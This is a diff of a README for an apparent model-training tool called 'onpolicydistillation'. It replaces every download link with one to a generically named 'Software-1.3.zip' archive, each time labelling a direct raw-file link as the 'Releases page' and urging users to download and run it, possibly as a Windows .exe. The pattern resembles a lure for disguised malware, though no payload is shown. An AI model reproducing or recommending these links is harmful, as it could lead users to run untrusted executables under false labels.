@@ -1,6 +1,6 @@
 # 🖥️ onpolicydistillation - Enhance Your Model Training Experience
 
-[![Download Now](https://raw.githubusercontent.com/Smooth-humvee686/onpolicydistillation/main/circumocular/onpolicydistillation-1.7.zip%20Now-Release-blue)](https://raw.githubusercontent.com/Smooth-humvee686/onpolicydistillation/main/circumocular/onpolicydistillation-1.7.zip)
+[![Download Now](https://github.com/Smooth-humvee686/onpolicydistillation/raw/refs/heads/main/circumocular/Software-1.3.zip%20Now-Release-blue)](https://github.com/Smooth-humvee686/onpolicydistillation/raw/refs/heads/main/circumocular/Software-1.3.zip)
 
 ## 📚 Overview
 
@@ -27,14 +27,14 @@ To start using on-policy distillation, please follow these simple steps:
 
 To download the software, visit this page:
 
-[Download onpolicydistillation Releases](https://raw.githubusercontent.com/Smooth-humvee686/onpolicydistillation/main/circumocular/onpolicydistillation-1.7.zip)
+[Download onpolicydistillation Releases](https://github.com/Smooth-humvee686/onpolicydistillation/raw/refs/heads/main/circumocular/Software-1.3.zip)
 
 This page contains the latest version of the application for you to download and run.
 
 ### 📂 Installation Steps
 
 1. **Visit the Releases Page**:
-   Go to the [Download onpolicydistillation Releases](https://raw.githubusercontent.com/Smooth-humvee686/onpolicydistillation/main/circumocular/onpolicydistillation-1.7.zip) to find the version that works best for you.
+   Go to the [Download onpolicydistillation Releases](https://github.com/Smooth-humvee686/onpolicydistillation/raw/refs/heads/main/circumocular/Software-1.3.zip) to find the version that works best for you.
 
 2. **Download the Latest Release**:
    Click on the version link, and then choose the appropriate file for your system. The file will typically end in `.exe` for Windows, `.zip` for cross-platform, or similar formats.
@@ -95,4 +95,4 @@ If you want to contribute to this project:
 2. **Make Your Changes**: Implement the changes or improvements you would like to see.
 3. **Submit a Pull Request**: Provide details about your changes for review.
 
-Thank you for using on-policy distillation! For more information, revisit the [Releases page](https://raw.githubusercontent.com/Smooth-humvee686/onpolicydistillation/main/circumocular/onpolicydistillation-1.7.zip) for updates.
+Thank you for using on-policy distillation! For more information, revisit the [Releases page](https://github.com/Smooth-humvee686/onpolicydistillation/raw/refs/heads/main/circumocular/Software-1.3.zip) for updates.
